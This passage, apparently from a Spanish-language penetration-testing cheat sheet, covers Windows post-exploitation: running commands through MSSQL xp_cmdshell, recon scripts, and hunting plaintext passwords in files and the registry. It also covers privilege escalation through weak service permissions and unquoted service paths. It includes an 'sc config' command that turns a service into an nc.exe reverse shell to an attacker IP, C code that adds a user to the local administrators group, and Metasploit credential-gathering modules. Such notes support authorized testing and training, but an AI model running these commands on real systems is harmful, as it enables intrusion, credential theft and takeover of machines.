1> xp_cmdshell 'whoami'
2>go

nt authority\ system
```

Puede ser que se de el caso donde tras lanzar la instrucciÃ³n **go**, se nos presente un mensaje que nos avisa de que el componente estÃ¡ deshabilitado. Para habilitarlo, simplemente seguimos las siguientes instrucciones:

```bash
1> EXEC SP_CONFIGURE 'show advanced options', 1
2> reconfigure
3> go
4> EXEC SP_CONFIGURE 'xp_cmdhshell', 1
5> reconfigure
6> go
7> xp_cmdshell "whoami"
8> go

nt authority\ system
```

Y ya lograremos ejecutar comandos sobre el sistema.

#### mssqlclient Impacket

El recurso lo podemos obtener [aquÃ­](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py), y su uso es similar al de **psexec**. En mi caso, lo uso cuando han cambiado el puerto por defecto:

```bash
python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758
```

Posteriormente, las consultas se hacen igual a las descritas en el anterior punto.

#### Reconocimiento del Sistema

Sobre el sistema Windows comprometido, a fin de escalar privilegios podemos llevar a cabo la siguiente enumeraciÃ³n manual, redireccionando todo a un fichero de reportes:

```bash
 @echo --------- BASIC WINDOWS RECON ---------  > report.txt
 timeout 1
 net config Workstation  >> report.txt
 timeout 1
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt
 timeout 1
 hostname >> report.txt
 timeout 1
 net users >> report.txt
 timeout 1
 ipconfig /all >> report.txt
 timeout 1
 route print >> report.txt
 timeout 1
 arp -A >> report.txt
 timeout 1
 netstat -ano >> report.txt
 timeout 1
 netsh firewall show state >> report.txt
 timeout 1
 netsh firewall show config >> report.txt
 timeout 1
 schtasks /query /fo LIST /v >> report.txt
 timeout 1
 tasklist /SVC >> report.txt
 timeout 1
 net start >> report.txt
 timeout 1
 DRIVERQUERY >> report.txt
 timeout 1
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
 timeout 1
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
 timeout 1
 dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt
 timeout 1
 findstr /si password *.xml *.ini *.txt >> report.txt
 timeout 1
 reg query HKLM /f password /t REG_SZ /s >> report.txt
 timeout 1
 reg query HKCU /f password /t REG_SZ /s >> report.txt
 timeout 1
 dir "C:\"
 timeout 1
 dir "C:\Program Files\" >> report.txt
 timeout 1
 dir "C:\Program Files (x86)\"
 timeout 1
 dir "C:\Users\"
 timeout 1
 dir "C:\Users\Public\"
 timeout 1
 echo REPORT COMPLETE!
```

A su vez, podemos hacer del recurso [wmic-info](https://github.com/ankh2054/windows-pentest/blob/master/wmic-info) a fin de obtener informaciÃ³n acerca del sistema.

Otra opciÃ³n, es utilizar [icacls.bat](https://github.com/ankh2054/windows-pentest/blob/master/icacls.bat), para la enumeraciÃ³n de permisos dÃ©biles a nivel de sistema.

Una buena herramienta a utilizar para la enumeraciÃ³n de permisos dÃ©biles asignados sobre archivos que son ejecutados a travÃ©s de tareas en intervalos regulares de tiempo es [schcheck.bat](https://github.com/ankh2054/windows-pentest/blob/master/schcheck.bat)

A continuaciÃ³n, se detallan algunos usos de *accesschk.exe*, ideal para identificar el nivel de acceso que un usuario o grupo particular tiene a archivos, directories o claves de registro.

```bash

accesschk "power users" c:\windows\system32
accesschk users -cw *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv adam.dale *
accesschk.exe -ucqv NetLogon
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk -kns austin\mruss hklm\software
accesschk -k hklm\software
accesschk -e -s c:\users\mark
accesschk -wuo everyone \basednamedobjects
```

#### Kernel Exploits Windows

A continuaciÃ³n, se enumeran distintos exploits de Kernel interesantes a usar que en mÃ¡s de una ocasiÃ³n han funcionado en las mÃ¡quinas del lab. AsÃ­ mismo es recomendable llevarlos siempre bajo la manga:

* [MS14-070](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070)
* [MS09-012](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-012)
* [MS11-046](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046)

#### Privilege Escalation Enumerations

A continuaciÃ³n, se detalla una enumeraciÃ³n bÃ¡sica del sistema.

**InformaciÃ³n BÃ¡sica**

```bash
systeminfo
hostname
```

**Â¿QuiÃ©nes somos?**

```bash
whoami
echo %username%
```

**Â¿QuÃ© usuarios y grupos locales existen en el sistema?**

```bash
net users
net localgroups
```

**Enumerar informaciÃ³n de usuario, interesante para ver si el usuario posee privilegios**

```bash
net user usuario
```

**Ver grupos de Dominio**

```bash
net group /domain
```

**Ver miembros del Domain Group**

```bash
net group /domain <Group Name>
```

**Firewall**

```bash
netsh firewall show state
netsh firewall show config
```

**Network**

```bash
ipconfig /all
route print
arp -A
```

**Â¿CÃ³mo de bien estÃ¡ parcheado el sistema?**

```bash
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

**BÃºsqueda de ContraseÃ±as en Texto Claro sobre el Sistema**

```bash
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

dir /s *pass* == *cred* == *vnc* == *.config*

findstr /spin "password" *.*
findstr /spin "password" *.*
```

**BÃºsqueda de ContraseÃ±as en Texto Claro sobre Archivos**

Es probable que nos las encontremos en Base64:

```bash
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```

**BÃºsqueda de ContraseÃ±as en Texto Claro Almacenadas en Registro**

```bash
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# BÃºsqueda de ContraseÃ±as almacenadas en Registro
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

**Scheduled Tasks**

```bash
schtasks /query /fo LIST /v > schtasks.txt
cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
```

**Cambio de binario para el servicio upnp**

```bash
sc config upnphost binpath= "C:\Inetpub\nc.exe 192.168.1.X 6666 -e c:\Windows\system32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost depend= ""
```

**BÃºsqueda de Permisos DÃ©biles**

```bash
wmic service list brief

# El comando anterior generarÃ¡ montÃ³n de contenido, por lo tanto, una buena prÃ¡ctica es parsear los resultados. Lo hacemos en los siguiente pasos.

for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt

for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt

FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt

FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt

FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt

# Procesamos a continuaciÃ³n cada uno de los resultados obtenidos vÃ­a cacls

cacls "C:\path\to\file.exe"
```

En este paso siempre vamos a estar interesados en el Output _BUILTIN\Users:(F)_, o que nuestro usuario cuente con los permisos _(F)_ o _(C)_:

```bash
C:\path\to\file.exe 
BUILTIN\Users:F
BUILTIN\Power Users:C 
BUILTIN\Administrators:F 
NT AUTHORITY\SYSTEM:F
```

Esto querÃ¡ decir que nuestro usuario posee permisos de escritura sobre dichos recursos, permitiÃ©ndonos de esta forma incrustrar un ejecutable malicioso. 

A continuaciÃ³n, se representa un ejemplo de cÃ³digo en C para un simple **getsuid**:

```bash
#include <stdlib.h>
int main ()
{
int i;
    i = system("net localgroup administrators theusername /add");
return 0;
}
```

Compilamos el mismo haciendo uso de la siguiente sintÃ¡xis:

```bash
i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
```

Una vez compilado y depositado sobre el sistema donde tenemos permisos de sobreescritura (sustituyendo el binario asignado al servicio), reiniciamos el servicio vÃ­a **wmic** o **net**, de la siguiente forma:

```bash
wmic service NAMEOFSERVICE call startservice

net stop [service name] && net start [service name].
```

**Unquoted Service Paths**

Esta tÃ©cnica es fundamental para la escalada de privilegios. En primer lugar buscamos servicios con Unquoted path:

```bash
# Usando WMIC
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

# Usando sc
sc query
sc qc service name
```

Si la ruta de alguno de los servicios listados contienen un espacio y no estÃ¡n doblemente encomillados, el servicio es vulnerable.

Suponiendo que la ruta fuera esta a modo de ejemplo:

```bash
c:\Program Files\something\winamp.exe
```

PodrÃ­amos depositar un binario tal que asÃ­:

```bash
c:\program.exe
```

Tras reiniciar el servicio, lo que sucederÃ¡ es que tomarÃ¡ como binario a ejecutar el situado en **c:\program.exe** en vez del que deberÃ­a, permitiendo asÃ­ llevar a cabo una ejecuciÃ³n con posibilidad de alto privilegio sobre el mismo.

**MÃ³dulos interesantes de Post-ExplotaciÃ³n desde Metasploit**

```bash
use exploit/windows/local/service_permissions

post/windows/gather/credentials/gpp

run post/windows/gather/credential_collector 

run post/multi/recon/local_exploit_suggester

run post/windows/gather/enum_shares

run post/windows/gather/enum_snmp

run post/windows/gather/enum_applications

run post/windows/gather/enum_logged_on_users

run post/windows/gather/checkvm
```
